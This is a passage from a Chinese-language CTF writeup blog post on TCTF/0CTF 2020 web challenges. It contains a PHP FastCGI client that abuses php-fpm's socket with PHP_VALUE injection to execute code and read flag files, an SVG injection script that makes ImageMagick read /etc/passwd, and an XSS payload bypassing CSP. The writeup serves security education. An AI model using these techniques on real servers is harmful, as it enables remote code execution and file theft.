24);</span></span><br><span class="line"><span class="string">                $vlen |= (ord($data&#123;$p++&#125;) &lt;&lt; 16);</span></span><br><span class="line"><span class="string">                $vlen |= (ord($data&#123;$p++&#125;) &lt;&lt; 8);</span></span><br><span class="line"><span class="string">                $vlen |= (ord($data&#123;$p++&#125;));</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">            $array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen);</span></span><br><span class="line"><span class="string">            $p += ($nlen + $vlen);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        return $array;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /**</span></span><br><span class="line"><span class="string">     * Decode a FastCGI Packet</span></span><br><span class="line"><span class="string">     *</span></span><br><span class="line"><span class="string">     * @param String $data String containing all the packet</span></span><br><span class="line"><span class="string">     * @return array</span></span><br><span class="line"><span class="string">     */</span></span><br><span class="line"><span class="string">    private function decodePacketHeader($data)</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        $ret = array();</span></span><br><span class="line"><span class="string">        $ret['version']       = ord($data&#123;0&#125;);</span></span><br><span class="line"><span class="string">        $ret['type']          = ord($data&#123;1&#125;);</span></span><br><span class="line"><span class="string">        $ret['requestId']     = (ord($data&#123;2&#125;) &lt;&lt; 8) + ord($data&#123;3&#125;);</span></span><br><span class="line"><span class="string">        $ret['contentLength'] = (ord($data&#123;4&#125;) &lt;&lt; 8) + ord($data&#123;5&#125;);</span></span><br><span class="line"><span class="string">        $ret['paddingLength'] = ord($data&#123;6&#125;);</span></span><br><span class="line"><span class="string">        $ret['reserved']      = ord($data&#123;7&#125;);</span></span><br><span class="line"><span class="string">        return $ret;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /**</span></span><br><span class="line"><span class="string">     * Read a FastCGI Packet</span></span><br><span class="line"><span class="string">     *</span></span><br><span class="line"><span class="string">     * @return array</span></span><br><span class="line"><span class="string">     */</span></span><br><span class="line"><span class="string">    private function readPacket()</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        if ($packet = fread($this-&gt;_sock, self::HEADER_LEN)) &#123;</span></span><br><span class="line"><span class="string">            $resp = $this-&gt;decodePacketHeader($packet);</span></span><br><span class="line"><span class="string">            $resp['content'] = '';</span></span><br><span class="line"><span class="string">            if ($resp['contentLength']) &#123;</span></span><br><span class="line"><span class="string">                $len  = $resp['contentLength'];</span></span><br><span class="line"><span class="string">                while ($len &amp;&amp; $buf=fread($this-&gt;_sock, $len)) &#123;</span></span><br><span class="line"><span class="string">                    $len -= strlen($buf);</span></span><br><span class="line"><span class="string">                    $resp['content'] .= $buf;</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">            if ($resp['paddingLength']) &#123;</span></span><br><span class="line"><span class="string">                $buf=fread($this-&gt;_sock, $resp['paddingLength']);</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">            return $resp;</span></span><br><span class="line"><span class="string">        &#125; else &#123;</span></span><br><span class="line"><span class="string">            return false;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /**</span></span><br><span class="line"><span class="string">     * Get Informations on the FastCGI application</span></span><br><span class="line"><span class="string">     *</span></span><br><span class="line"><span class="string">     * @param array $requestedInfo information to retrieve</span></span><br><span class="line"><span class="string">     * @return array</span></span><br><span class="line"><span class="string">     */</span></span><br><span class="line"><span class="string">    public function getValues(array $requestedInfo)</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        $this-&gt;connect();</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        $request = '';</span></span><br><span class="line"><span class="string">        foreach ($requestedInfo as $info) &#123;</span></span><br><span class="line"><span class="string">            $request .= $this-&gt;buildNvpair($info, '');</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        fwrite($this-&gt;_sock, $this-&gt;buildPacket(self::GET_VALUES, $request, 0));</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        $resp = $this-&gt;readPacket();</span></span><br><span class="line"><span class="string">        if ($resp['type'] == self::GET_VALUES_RESULT) &#123;</span></span><br><span class="line"><span class="string">            return $this-&gt;readNvpair($resp['content'], $resp['length']);</span></span><br><span class="line"><span class="string">        &#125; else &#123;</span></span><br><span class="line"><span class="string">            throw new Exception('Unexpected response type, expecting GET_VALUES_RESULT');</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    public function request(array $params, $stdin)</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        $response = '';</span></span><br><span class="line"><span class="string">        $this-&gt;connect();</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        $request = $this-&gt;buildPacket(self::BEGIN_REQUEST, chr(0) . chr(self::RESPONDER) . chr((int) $this-&gt;_keepAlive) . str_repeat(chr(0), 5));</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        $paramsRequest = '';</span></span><br><span class="line"><span class="string">        foreach ($params as $key =&gt; $value) &#123;</span></span><br><span class="line"><span class="string">            $paramsRequest .= $this-&gt;buildNvpair($key, $value);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        if ($paramsRequest) &#123;</span></span><br><span class="line"><span class="string">            $request .= $this-&gt;buildPacket(self::PARAMS, $paramsRequest);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        $request .= $this-&gt;buildPacket(self::PARAMS, '');</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        if ($stdin) &#123;</span></span><br><span class="line"><span class="string">            $request .= $this-&gt;buildPacket(self::STDIN, $stdin);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        $request .= $this-&gt;buildPacket(self::STDIN, '');</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        fwrite($this-&gt;_sock, $request);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        do &#123;</span></span><br><span class="line"><span class="string">            $resp = $this-&gt;readPacket();</span></span><br><span class="line"><span class="string">            if ($resp['type'] == self::STDOUT || $resp['type'] == self::STDERR) &#123;</span></span><br><span class="line"><span class="string">                $response .= $resp['content'];</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">        &#125; while ($resp &amp;&amp; $resp['type'] != self::END_REQUEST);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        if (!is_array($resp)) &#123;</span></span><br><span class="line"><span class="string">            throw new Exception('Bad request');</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">       </span></span><br><span class="line"><span class="string">        switch (ord($resp['content'][4])) &#123;</span></span><br><span class="line"><span class="string">            case self::CANT_MPX_CONN:</span></span><br><span class="line"><span class="string">                throw new Exception('This app cant multiplex [CANT_MPX_CONN]');</span></span><br><span class="line"><span class="string">                break;</span></span><br><span class="line"><span class="string">            case self::OVERLOADED:</span></span><br><span class="line"><span class="string">                throw new Exception('New request rejected; too busy [OVERLOADED]');</span></span><br><span class="line"><span class="string">                break;</span></span><br><span class="line"><span class="string">            case self::UNKNOWN_ROLE:</span></span><br><span class="line"><span class="string">                throw new Exception('Role value not known [UNKNOWN_ROLE]');</span></span><br><span class="line"><span class="string">                break;</span></span><br><span class="line"><span class="string">            case self::REQUEST_COMPLETE:</span></span><br><span class="line"><span class="string">                return $response;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$client = new AA("unix:///var/run/php-fpm.sock");</span></span><br><span class="line"><span class="string">$req = '/var/www/html/index.php';</span></span><br><span class="line"><span class="string">$uri = $req .'?'.'command=ls';</span></span><br><span class="line"><span class="string">var_dump($client);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$code = "&lt;?php var_dump(scandir('/'));echo base64_encode(file_get_contents('/flag.h'));\\n?&gt;";</span></span><br><span class="line"><span class="string">$php_value = "allow_url_include = On\\nopen_basedir = /\\nauto_prepend_file = php://input";</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$params = array(       </span></span><br><span class="line"><span class="string">        'GATEWAY_INTERFACE' =&gt; 'FastCGI/1.0',</span></span><br><span class="line"><span class="string">        'REQUEST_METHOD'    =&gt; 'POST',</span></span><br><span class="line"><span class="string">        'SCRIPT_FILENAME'   =&gt; '/var/www/html/index.php',</span></span><br><span class="line"><span class="string">        'SCRIPT_NAME'       =&gt; '/var/www/html/index.php',</span></span><br><span class="line"><span class="string">        'QUERY_STRING'      =&gt; 'command=ls',</span></span><br><span class="line"><span class="string">        'REQUEST_URI'       =&gt; $uri,</span></span><br><span class="line"><span class="string">        'DOCUMENT_URI'      =&gt; $req,</span></span><br><span class="line"><span class="string">        #'DOCUMENT_ROOT'     =&gt; '/',</span></span><br><span class="line"><span class="string">        'PHP_VALUE'         =&gt; $php_value,</span></span><br><span class="line"><span class="string">        'SERVER_SOFTWARE'   =&gt; 'asd',</span></span><br><span class="line"><span class="string">        'REMOTE_ADDR'       =&gt; '127.0.0.1',</span></span><br><span class="line"><span class="string">        'REMOTE_PORT'       =&gt; '9985',</span></span><br><span class="line"><span class="string">        'SERVER_ADDR'       =&gt; '127.0.0.1',</span></span><br><span class="line"><span class="string">        'SERVER_PORT'       =&gt; '80',</span></span><br><span class="line"><span class="string">        'SERVER_NAME'       =&gt; 'localhost',</span></span><br><span class="line"><span class="string">        'SERVER_PROTOCOL'   =&gt; 'HTTP/1.1',</span></span><br><span class="line"><span class="string">        'CONTENT_LENGTH'    =&gt; strlen($code)</span></span><br><span class="line"><span class="string">);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">echo "Call: $uri\\n\\n";</span></span><br><span class="line"><span class="string">var_dump($client-&gt;request($params, $code));</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">ret = execute_php_code(code)</span><br><span class="line">print(ret)</span><br></pre></td></tr></table></figure>
+
+<p>然后可以发现根目录的 <code>flag.so</code> 和 <code>flag.h</code>, 读取后 strings 一下就能读到 flag. 不过可以看到是与 ffi 有关的, 所以这做法应该是非预期了, 不过之后又上了个 noeasyphp 修了几个非预期解.<br>最后试了下用 ffi 拿 flag,  </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ffi = FFI::load(<span class="string">"/flag.h"</span>);</span><br><span class="line">var_dump($ffi);</span><br><span class="line">var_dump($ffi-&gt;flag_fUn3t1on_fFi());</span><br></pre></td></tr></table></figure>
+
+<p>也是能读到 flag 的, 不过这方法名和文件名是怎么预期得到呢, 猜测可能需要用 ffi 的功能去直接越界读内存? 感觉预期解更有意思一点.  </p>
+<h2 id="Wechat-Generator"><a href="#Wechat-Generator" class="headerlink" title="Wechat Generator"></a>Wechat Generator</h2><p>大概功能如下: </p>
+<ol>
+<li>前端提交对话到后端, 后端返回生成的 svg 和对应的 id 到前端预览</li>
+<li>前端提交 id 到后端, 渲染 svg 到图片</li>
+</ol>
+<p>问题出在生成, 有个功能是插入表情, 比如 <code>[cool]</code>, 会被替换为  </p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">image</span> <span class="attr">x</span>=<span class="string">"1240"</span> <span class="attr">y</span>=<span class="string">"-60"</span> <span class="attr">height</span>=<span class="string">"100"</span> <span class="attr">xmlns:xlink</span>=<span class="string">"http://www.w3.org/1999/xlink"</span> <span class="attr">xlink:href</span>=<span class="string">"http://pwnable.org:5000/static/emoji/cool"</span>/&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>显然可能存在注入, 我们输入 <code>[cool&quot;&gt;&lt;a&gt;&lt;/a&gt;&lt;a href=&quot;]</code>, 就成功注入了 <code>&lt;a&gt;&lt;/a&gt;</code> 到 svg 里面. 这里可以想到之前空指针的一道题, imagemagick 在对 <code>text:/</code> 协议解析时, 会直接读取文件里的内容, 于是我们就能通过这个方式, 注入一个图片, 链接到 <code>text:/etc/passwd</code>, 之后就能通过后端渲染得到的图片, 得到文件内容.  </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">sess = requests.session()</span><br><span class="line"></span><br><span class="line">d = <span class="string">'''</span></span><br><span class="line"><span class="string">[&#123;"type":0,"message":"Love you!&lt;a&gt;asd&lt;/a&gt;[cool\\"/&gt;&lt;image xlink:href=\\"text:/etc/passwd\\" x='-400px' y='400px' height='1500px' width='1500px'/&gt;&lt;a href=\\"]"&#125;,&#123;"type":1,"message":"Me too!!!"&#125;]</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">res = sess.post(<span class="string">'http://pwnable.org:5000/preview'</span>, data=&#123;<span class="string">'data'</span>: d&#125;)</span><br><span class="line">svg = base64.b64decode(res.json()[<span class="string">'data'</span>][len(<span class="string">'data:image/svg+xml;base64,'</span>):])</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'1.svg'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(svg)</span><br><span class="line"></span><br><span class="line">pid = res.json()[<span class="string">'previewid'</span>]</span><br><span class="line">res = sess.post(<span class="string">'http://pwnable.org:5000/share'</span>, data=&#123;<span class="string">'previewid'</span>: pid&#125;)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>
+
+<p>这里注意, 注入的内容前面一定要跟点东西, 不能直接这样 <code>[&quot;&gt;&lt;a&gt;&lt;/a&gt;&lt;a href=&quot;]</code>, 因为 <code>http://pwnable.org:5000/static/emoji/</code>, 返回的是 404, 而 <code>http://pwnable.org:5000/static/emoji/随意的内容</code> 返回的是微笑. 如果什么都没有, imagemagick 得到 404 的话, 解析会直接中止.  </p>
+<p>现在就能读取文件了, 结合后端是 python, 然后一顿测试, 得到应用在 <code>/app/app.py</code>, 可惜这里因为 imagemagick 的问题, 能读的源码有限, 调大图片尺寸也只能得到放大的文字, 不能显示更多的文字.  </p>
+<p>部分源码:  </p>
+<p><img src="https://i.loli.net/2020/06/29/Gde8ry9uX3TKjR7.png" alt="">  </p>
+<p>访问 <code>http://pwnable.org:5000/SUp3r_S3cret_URL/0Nly_4dM1n_Kn0ws</code>, 然后题目一转 xss… 要求 alert(1).<br>因为这里有 csp 限制, 没法直接在 svg 里面用 script alert, 导致这里卡了挺久, 然后发现 imagemagick 生成的文件拓展名是可控的, 也就是第二步, 得到图片的路径是 <code>http://pwnable.org:5000/image/gzVIsH/png</code>, 修改最后的 png 到 svg, 就会如蜜传如蜜, 直接输出一张的 svg, 而且 content-type 也会改变. 不过这里后端限制了扩展名长度只能为 3, 否则会直接报错.<br>这里查看文档, 发现 imagemagick 是支持输出 htm 的, <code>http://pwnable.org:5000/image/gzVIsH/htm</code> 得到的就是 htm, content-type 也变成了 <code>text/html</code>. 于是 xss 思路就来了, 看到源码的过滤是直接替换为空, 可以用喜闻乐见的双写绕过.<br>然后在 svg 里面把最外面的 svg tag 给闭合了, 插入一个 html tag, 再用 meta 标签跳到我们的站上 alert(1) 即可, 这样就绕过了 csp.  </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">d = <span class="string">'''</span></span><br><span class="line"><span class="string">[&#123;"type":0,"message":"Love you!&lt;a&gt;asd&lt;/a&gt;[cool\\"/&gt;&lt;/g&gt;&lt;/svg&gt;&lt;html&gt;&lt;metmetaa http-equiv='refresh' content=\\"0;URL='http://site.com/'\\" /&gt;&lt;/html&gt;&lt;a href=\\"]"&#125;,&#123;"type":1,"message":"Me too!!!"&#125;]</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>
+
+<p>不过感觉可能也是非预期? 因为看源码还有个可控 callback name 的 jsonp 没用上.  </p>
+<p>PS. 这里其实可以直接读 /proc/self/environ 来读环境变量, 可惜 imagemagick 碰到 \x00 就停止读取了, 导致只能读取第一个环境变量 PATH, 都不到后面的 flag</p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>rmb122
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://rmb122.com/2020/06/29/TCTF-0CTF-2020-Writeup/" title="TCTF&#x2F;0CTF 2020 Writeup">https://rmb122.com/2020/06/29/TCTF-0CTF-2020-Writeup/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章仅仅记录学习过程, 并不保证文章完全正确, 如果你有任何疑问或者找出问题, 欢迎在评论区指正.
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/web/" rel="tag"># web</a>
+              <a href="/tags/writeup/" rel="tag"># writeup</a>
+              <a href="/tags/0ctf/" rel="tag"># 0ctf</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/06/12/fastjson-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-gadgets-%E6%8C%96%E6%8E%98%E7%AC%94%E8%AE%B0/" rel="prev" title="fastjson 1.2.68 反序列化漏洞 gadgets 挖掘笔记">
+      <i class="fa fa-chevron-left"></i> fastjson 1.2.68 反序列化漏洞 gadgets 挖掘笔记
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/09/07/DDCTF-2020-Writeup/" rel="next" title="DDCTF 2020 Writeup">
+      DDCTF 2020 Writeup <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#easyphp"><span class="nav-number">1.</span> <span class="nav-text">easyphp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Wechat-Generator"><span class="nav-number">2.</span> <span class="nav-text">Wechat Generator</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="rmb122"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">rmb122</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">68</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">24</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/rmb122" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;rmb122" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/atom.xml" title="RSS → &#x2F;atom.xml"><i class="fa fa-rss fa-fw"></i>RSS</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">rmb122</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/mist/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+<script>
+  (function() {
+    function leancloudSelector(url) {
+      url = encodeURI(url);
+      return document.getElementById(url).querySelector('.leancloud-visitors-count');
+    }
+
+    function addCount(Counter) {
+      var visitors = document.querySelector('.leancloud_visitors');
+      var url = decodeURI(visitors.id);
+      var title = visitors.dataset.flagTitle;
+
+      Counter('get', '/classes/Counter?where=' + encodeURIComponent(JSON.stringify({ url })))
+        .then(response => response.json())
+        .then(({ results }) => {
+          if (results.length > 0) {
+            var counter = results[0];
+            leancloudSelector(url).innerText = counter.time + 1;
+            Counter('put', '/classes/Counter/' + counter.objectId, { time: { '__op': 'Increment', 'amount': 1 } })
+              .catch(error => {
+                console.error('Failed to save visitor count', error);
+              });
+          } else {
+              leancloudSelector(url).innerText = 'Counter not initialized! More info at console err msg.';
+              console.error('ATTENTION! LeanCloud counter has security bug, see how to solve it here: https://github.com/theme-next/hexo-leancloud-counter-security. \n However, you can still use LeanCloud without security, by setting `security` option to `false`.');
+            
+          }
+        })
+        .catch(error => {
+          console.error('LeanCloud Counter Error', error);
+        });
+    }
+
+    function showTime(Counter) {
+      var visitors = document.querySelectorAll('.leancloud_visitors');
+      var entries = [...visitors].map(element => {
+        return decodeURI(element.id);
+      });
+
+      Counter('get', '/classes/Counter?where=' + encodeURIComponent(JSON.stringify({ url: { '$in': entries } })))
+        .then(response => response.json())
+        .then(({ results }) => {
+          for (let url of entries) {
+            let target = results.find(item => item.url === url);
+            leancloudSelector(url).innerText = target ? target.time : 0;
+          }
+        })
+        .catch(error => {
+          console.error('LeanCloud Counter Error', error);
+        });
+    }
+
+    let { app_id, app_key, server_url } = {"enable":true,"app_id":"rVVd10sU0t2cjpEvSiQh7av7-MdYXbMMI","app_key":"Y31jyHHMWPckrz1X8Fn9EUi0","server_url":null,"security":true};
+    function fetchData(api_server) {
+      var Counter = (method, url, data) => {
+        return fetch(`${api_server}/1.1${url}`, {
+          method,
+          headers: {
+            'X-LC-Id'     : app_id,
+            'X-LC-Key'    : app_key,
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(data)
+        });
+      };
+      if (CONFIG.page.isPost) {
+        if (CONFIG.hostname !== location.hostname) return;
+        addCount(Counter);
+      } else if (document.querySelectorAll('.post-title-link').length >= 1) {
+        showTime(Counter);
+      }
+    }
+
+    let api_server = app_id.slice(-9) !== '-MdYXbMMI' ? server_url : `https://${app_id.slice(0, 8).toLowerCase()}.api.lncldglobal.com`;
+
+    if (api_server) {
+      fetchData(api_server);
+    } else {
+      fetch('https://app-router.leancloud.cn/2/route?appId=' + app_id)
+        .then(response => response.json())
+        .then(({ api_server }) => {
+          fetchData('https://' + api_server);
+        });
+    }
+  })();
+</script>
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    new Valine(Object.assign({
+      el         : '#valine-comments',
+      path       : location.pathname,
+    }, {"enable":true,"appId":"rVVd10sU0t2cjpEvSiQh7av7-MdYXbMMI","appKey":"Y31jyHHMWPckrz1X8Fn9EUi0","notify":false,"verify":true,"placeholder":"Write something here","avatar":"retro","meta":["nick","mail"],"pageSize":10,"language":null,"visitor":false,"comment_count":true,"recordIP":false,"serverURLs":null}
+    ));
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
